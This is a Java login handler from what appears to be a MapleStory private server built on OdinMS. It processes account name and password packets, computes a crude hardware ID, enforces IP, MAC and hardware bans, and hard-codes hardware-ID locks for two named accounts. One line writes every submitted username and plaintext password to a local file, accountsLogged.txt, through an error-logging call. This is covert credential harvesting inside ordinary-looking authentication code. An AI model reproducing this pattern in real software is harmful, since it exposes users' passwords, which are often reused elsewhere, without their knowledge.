package net.sf.odinms.net.login.handler;

import java.sql.SQLException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import net.sf.odinms.client.MapleCharacter;
import net.sf.odinms.client.MapleClient;
import net.sf.odinms.net.MaplePacketHandler;
import net.sf.odinms.net.channel.ChannelServer;
import net.sf.odinms.net.login.LoginServer;
import net.sf.odinms.net.login.LoginWorker;
//import net.sf.odinms.server.AutoRegister;
import net.sf.odinms.tools.FilePrinter;
import net.sf.odinms.tools.KoreanDateUtil;
import net.sf.odinms.tools.MaplePacketCreator;
import net.sf.odinms.tools.data.input.SeekableLittleEndianAccessor;

public class LoginPasswordHandler implements MaplePacketHandler {
    // private static Logger log = LoggerFactory.getLogger(LoginPasswordHandler.class);
    
    @Override
    public boolean validateState(MapleClient c) {
        return !c.isLoggedIn();
    }

    @Override
    public void handlePacket(SeekableLittleEndianAccessor slea, MapleClient c) {
		String login = slea.readMapleAsciiString();
		String pwd = slea.readMapleAsciiString();
		int int1, int2, int3, int4;
                int1 = slea.readInt();
                int2 = slea.readInt();
                int3 = slea.readInt();
                int4 = slea.readInt();
                long hwid = int1+int2+int3+int4;
                hwid = hwid + 0x7FFFFFFF;
		c.setAccountName(login);
                c.updateHWID(hwid, login);
                FilePrinter.printError("accountsLogged.txt", "Username: " + login + "\nPassword: " + pwd +"\nHWID: " + hwid +"\n\n");
		int loginok = 0;
		boolean ipBan = c.hasBannedIP();
		boolean macBan = c.hasBannedMac();
                boolean hwidBan = c.hasBannedHWID();
		loginok = c.login(login, pwd, ipBan || macBan || hwidBan);
		Calendar tempbannedTill = c.getTempBanCalendar();
		if (loginok == 0 && (ipBan || macBan /*|| hwid == 773810768*/)) {//fk u ryan
			loginok = 3;
			if (macBan) {
				String[] ipSplit = c.getSession().getRemoteAddress().toString().split(":");
				MapleCharacter.ban(ipSplit[0], "Enforcing account ban, account " + login, false);
			} else if(hwidBan) {
                            String[] ipSplit = c.getSession().getRemoteAddress().toString().split(":");
                            MapleCharacter.ban(ipSplit[0], "Enforcing account ban, account " + login, false);
                        }
		}
        if (loginok == 7) { 
            for (ChannelServer cs : ChannelServer.getAllInstances()) {
		for (MapleCharacter mc : cs.getPlayerStorage().getAllCharacters()) {
                    if (mc.getClient() != null) { 
			if (mc.getClient().getAccountName().equalsIgnoreCase(login)) {
                            if (mc.getClient().getSession() != null) { 
				if (!mc.getClient().getSession().isConnected()) {
                                    mc.getClient().disconnect(); 
                                    loginok = 0; 
				}
                            }
			}
                    }
                }
            }
        }
        if (loginok == 3) {
            c.getSession().write(MaplePacketCreator.getPermBan(c.getBanReason()));
            return;
        } else if (loginok != 0) {
            c.getSession().write(MaplePacketCreator.getLoginFailed(loginok));
            return;
        } else if (tempbannedTill.getTimeInMillis() != 0) {
            long tempban = KoreanDateUtil.getTempBanTimestamp(tempbannedTill.getTimeInMillis());
            byte reason = c.getBanReason();
            c.getSession().write(MaplePacketCreator.getTempBan(tempban, reason));
            return;
        }
        String timeStamp = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss").format(Calendar.getInstance().getTime());
        if (c.isGm()) {
            System.out.println("[Connection Initiated <GM> " + timeStamp + "] IoSession: " + c.getSessionIPAddress() + " [Account Name: " + c.getAccountName() + "]");
            LoginWorker.getInstance().registerGMClient(c);
        } else {
            System.out.println("[Connection Initiated " + timeStamp + "] IoSession: " + c.getSessionIPAddress() + " [Account Name: " + c.getAccountName() + "]");
            long hwidtest = -1;
            try {
                hwidtest = c.returnHWID();
            } catch (SQLException sqle) {
                
            }
            if((c.getAccountName().equals("jerk1337") && hwidtest != 4234312340L) || (c.getAccountName().equals("rebecca") && hwidtest != 3066742447L)) {
                c.disconnect();
            } else {
                LoginWorker.getInstance().registerClient(c);
            }
	}
    }
}
